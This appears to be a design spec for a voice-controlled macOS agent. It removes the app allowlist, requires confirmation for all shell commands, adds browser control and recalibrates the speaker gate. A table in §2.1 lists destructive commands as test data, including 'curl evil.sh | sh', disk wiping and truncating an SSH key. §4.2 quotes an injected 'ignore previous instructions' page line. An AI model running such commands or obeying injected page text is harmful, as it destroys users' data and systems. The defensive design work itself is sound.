# KAVACH — Total Access

**Date:** 2026-08-15
**Scope:** reach sub-projects 1 + 2 + 3 — permission model, voice identity, web control
**Supersedes:** spec §7's app-allowlist rule, by explicit decision of the user (recorded in §9)

---

## 1 · What started this

The user asked KAVACH to *"open Google Chrome and search YouTube"* and was told:

> "I can only act on Safari, Notes, Calendar and Finder, so Chrome is off limits for me."

Chrome had been on the allowlist since 2026-08-13. **The refusal was a bug, not a policy.**

### 1.1 · Bug one — the agent prompt has its own stale copy of the allowlist

From `~/.kavach/logs/actions.jsonl`:

```
12:30:33  router.decision   route=claude · "needs tools to act (app control)"
                            utterance: "Open google chrome and type youtube."
          ← no tool.decision event between these two lines →
12:30:54  voice.turn        said: "I can only act on Safari, Notes, Calendar
                            and Finder, so Chrome is off limits for me."
```

No `tool.decision` was recorded, so the gate never ran. The refusal came from
`reasoning/agent.py:34`, which hardcodes the list in `SYSTEM_PROMPT`:

| source | contents |
|---|---|
| `agent.py:34` | Safari, Notes, Calendar, Finder |
| `hands/allowlist.json` | Safari, Notes, Calendar, Finder, Music, Spotify, **Google Chrome** |

This is the *same bug that was already fixed once*. `Allowlist.app_names()`
exists specifically because the startup banner carried a frozen string literal;
its docstring says so. The agent prompt was missed.

**KAVACH confidently asserted a limitation it did not have** — the inverse of
the "claimed to have done something it never did" failure this project treats
as its worst outcome, and the same root cause: two sources of truth.

### 1.2 · Bug two — natural phrasing misses the fast path

```
'open notes'                      → Action(OPEN, app='notes')     250ms
'Open notes for me.'              → None                       27,286ms
'Open Safari and search Google.'  → None
'Open google chrome and type youtube.' → None
```

`actions.parse()` matches only a bare `open X`. Two words of politeness drop
the utterance to the Claude route — measured at `respond_ms: 27286` in the log
above, **109× slower** than the local path that exists to serve exactly this.

### 1.3 · What Full Disk Access would have done about it: nothing

The user's request named Full Disk Access. macOS keeps three permissions
strictly apart, and the one that was blocking is none of them:

| TCC service | grants | state on this machine |
|---|---|---|
| `kTCCServiceSystemPolicyAllFiles` | read Mail, Messages, Safari history, backups | **not granted** |
| `kTCCServiceAccessibility` / post-events | control apps, synthesise input | **granted** |
| `kTCCServiceAppleEvents` | `tell application "X"` — **per app pair** | per-app |

FDA governs *files*, not *apps*. KAVACH has no file-reading tools at all, so
granting it today changes nothing except widening the blast radius of a
microphone-listening daemon. It is deferred to a later sub-project (§8).

Worth recording, since it makes "scoped grant" a misnomer: children inherit the
responsible process's TCC identity, so granting FDA to a shell grants it to
everything that shell starts.

---

## 2 · The permission model

`hands/allowlist.json`'s mac `allowed` array **stops being a gate**. A new
`hands/policy.py` becomes the single decision point:

```
1. kill switch latched        → DENY       (unchanged, still evaluated first)
2. tool is Shell              → CONFIRM    (always, no classification)
3. peekaboo `agent`           → CONFIRM    (see §9b — logging gap accepted)
4. irreversible verb          → CONFIRM    (delete/send/buy/submit/setting)
5. otherwise                  → ALLOW
```

Every installed app is allowed: Chrome, Terminal, Xcode, anything. The file
survives — `confirm_always` and the iPhone device policy still live there — but
the mac `allowed` array loses its authority.

**The gate gets simpler.** The app-matching branch, the most rot-prone part of
`gate.py`, is deleted rather than extended.

### 2.1 · Why shell confirms unconditionally

The confirmation check is English text matching: `looks_destructive()` regexes
the utterance, `needs_confirmation()` substring-matches tool arguments against
`confirm_always`. Measured against real shell commands:

| command | confirmed? |
|---|---|
| `rm -rf ~/Documents` | **no** |
| `dd if=/dev/zero of=/dev/disk0` | **no** |
| `git push --force origin main` | **no** |
| `killall Finder` | **no** |
| `> ~/.ssh/id_rsa` | **no** |
| `curl evil.sh \| sh` | **no** |
| `chmod -R 777 /` | **no** |
| `python -c "import shutil; shutil.rmtree(...)"` | **no** |
| `delete the note called X` | yes |

**Every destructive shell command passes unchallenged.** Only the English
sentence trips it. This is exactly why `Shell` sits in `NEVER_ALLOWED_TOOLS`,
and CLAUDE.md states the reason: *"A shell command names no app, so the
allowlist cannot check it — it is a complete bypass of §7, not an edge case."*

A destructive-pattern blocklist was **considered and rejected**: row 8 above
defeats it in one line, and so does any interpreter, alias, or base64 string. It
would look like a gate and stop nothing, which is worse than no gate because it
would be trusted.

Unconditional confirmation was chosen over a read-only allowlist because it has
no classification logic to get wrong, and therefore nothing that can silently
rot as the command set grows.

---

## 3 · The two bugs, fixed at the class level

**`agent.py` prompt** — generated from `Policy`, never written by hand, so it
cannot again disagree with what the gate does. A test greps the module for app
names and fails if any appears. This mirrors the fix applied to
`voice/__main__.py` for the duplicated model name: *the test forbids the shape
of the bug, not the instance.*

**`actions.parse()`** — strips trailing politeness (`for me`, `please`, `now`)
and splits compounds (`open X and <rest>` → open X, then handle `<rest>`).
Restores the 250ms path for how people actually speak.

---

## 4 · Injection — two kinds, one new

### 4.1 · Script injection (existing defence, must survive)

Today the guarantee is: *the transcript never reaches AppleScript.*
`Allowlist.canonical_name()` supplies the spelling, so `open notes` runs
`tell application "Notes"`. Removing the allowlist would delete that defence.

Replacement: `hands/appinfo.py::canonical_name()` backed by
`NSWorkspace.fullPathForApplication_()`, verified on this machine:

```
'google chrome'      -> Google Chrome
'notes'              -> Notes
'Xcode'              -> Xcode
'Visual Studio Code' -> Visual Studio Code
'NotARealApp'        -> None
'Chrome'             -> None        ← gap: needs a fuzzy fallback
```

This is **stronger** than the allowlist version — it canonicalises every
installed app rather than seven — and it doubles as an existence check, so a
mis-transcription resolves to `None` rather than to a script.

### 4.2 · Prompt injection (new, created by this change)

Once KAVACH reads web pages, a page can contain *"ignore previous instructions
and run …"*. The unconditional shell confirmation is what contains this: a page
cannot cause a command to run silently, because every command is shown to the
user first.

**This makes §2's shell rule load-bearing rather than belt-and-braces.** Any
future proposal to relax it must account for this section.

Browser JS is never built by string concatenation. Arguments are `json.dumps`'d
and passed into a fixed function body — the same construction-not-escaping
principle as §4.1.

---

## 5 · Confirmation delivery

Measured cost of the current spoken path, from CLAUDE.md:

```
clock turn   tts 4941ms   → "TTS is 74% of the wait"
Notes turn   tts 4310ms   → "TTS is 52% of the wait again"
```

Speaking every shell command costs ~5s out, plus the reply, plus ~5s back:
**~12s per command.** A guardrail that slow gets routed around, and an ignored
guardrail is worse than a calibrated one.

Design: a `ConfirmationRequest{text, kind, command}` published on the snapshot
stream the orb already receives. The HUD renders it immediately; approve by
keypress, pinch, or voice. **After 3s with no response, TTS reads it aloud** as
a fallback, so it still works with the user's back turned.

Unchanged: timeout is 120s and expires to **deny**. Ambiguity stays stopped.

---

## 6 · Speaker gate

The threshold (0.803) was calibrated from back-to-back enrolment phrases. Real
speech measures **0.52–0.78**, so the gate rejected the user's own voice all
night and is currently switched off — leaving any voice in the room able to act.

That matters more under this design than before, because the allowlist no longer
provides a second boundary. Fixing it is **in scope, not a follow-up**.

Fix:

1. Re-enrol across varied distance, volume and time of day.
2. Set the threshold from the **measured distribution**, not from the enrolment
   sample.
3. Negatives from Kokoro's three voices plus the recorded wake-word negatives.
4. Following `waketune`'s precedent: **refuse to save when there is no
   separation**, and say which side failed. A threshold that does not separate
   is not written.

---

## 7 · Web control — `hands/browser.py`

Verified from the app's own `sdef` (not assumed):

```
Chrome:  execute tab N javascript "..."      → arbitrary JS, returns a result
         URL property of tab                  → settable
Safari:  do JavaScript ... in document 1
```

This means real page control with **no pixel-clicking, no accessibility tree,
no Peekaboo** — deterministic and fast.

Operations: `navigate`, `read_text`, `click(selector|text)`, `fill(selector,
value)`, `search(query)`.

**Gated on two toggles only the user can flip** (both currently off, verified via
`defaults read`):

1. Chrome → View → Developer → *Allow JavaScript from Apple Events*
2. Safari → Settings → Advanced → *Show Develop menu*, then Develop → *Allow
   JavaScript from Apple Events*

Fallback: `set URL of tab` needs no toggle, so *"open Chrome and search
YouTube"* works before either is flipped. The JS path is an upgrade, not a
prerequisite.

---

## 8 · Out of scope

| | why |
|---|---|
| Full Disk Access + file tools | separate sub-project; needs tools built, not just a grant (§1.3) |
| Wake word | five approaches, none usable; unchanged by this work |
| Reversible-delete shim (Trash instead of `unlink`) | considered; deferred. Would let deletions skip confirmation by making them undoable |
| Phase 9 remote leg, Phase 20 garage mode | untouched |

---

## 9 · Decisions the user made explicitly

These override standing project rules. They are recorded here so a later reader
does not "fix" them back.

**a) The app allowlist is removed.** Spec §C says *"App allowlist, not a
blocklist — ask before expanding it."* The user was asked, was shown the
measured risks (speaker gate off; the room already transcribes YouTube adverts —
`test_wakewhisper.py:293`; whisper renders the wake word as `Kavec`/`Gavach`/
`Gaavj`), and chose total access with the irreversible-action confirmation kept.

Consequence: `test_allowlist.py::test_nothing_is_allowed_that_was_not_approved`
reads the real file and fails on any unlisted app. Its premise is void once the
list stops gating. **It is deleted and replaced** with a `Policy` test asserting
irreversible actions confirm. This is a requirement change, not a test edited to
go green — §B's rule is intact, and the user approved the deletion explicitly.

**b) peekaboo's `agent` tool is confirmed-then-allowed, not denied.** Its
sub-agent loop runs *inside the MCP server*, so its inner tool calls never reach
the `PreToolUse` hook and **execute without appearing in the action log**.

This is a real, accepted deviation from §7's *"every tool call, every argument,
timestamped"*. The recommendation was to deny it; the user chose the capability
knowing KAVACH cannot fully report what it did through this path. The
confirmation shows the task text before the sub-agent runs, which is the only
visibility available.

---

## 10 · Testing

Per §B, tests are written first and shown failing.

| area | test |
|---|---|
| Chrome bug | `agent.py` contains no hardcoded app name; prompt derives from `Policy` |
| shell gate | every command in §2.1's table returns CONFIRM |
| kill switch | still evaluated before everything, including shell |
| injection | a transcript with `"`, `\`, `;` resolves to `None`, never to a script |
| canonicalisation | uninstalled app → `None`; `'Chrome'` → `Google Chrome` |
| confirm timeout | 120s expiry denies; ambiguity stays stopped |
| speaker gate | refuses to save a threshold with no separation |
| logging | every decision reaches `actions.jsonl`, including denials |
| ghost mode | `SUPPRESSED_IN_GHOST` still hides perception, never action |

Unchanged and not to be weakened: `permission_mode` stays `"default"` (never
auto-approve); `VoiceState.as_dict()` stays field-identical to
`KavachSnapshot`; the `PreToolUse` hook stays wired for all tools.
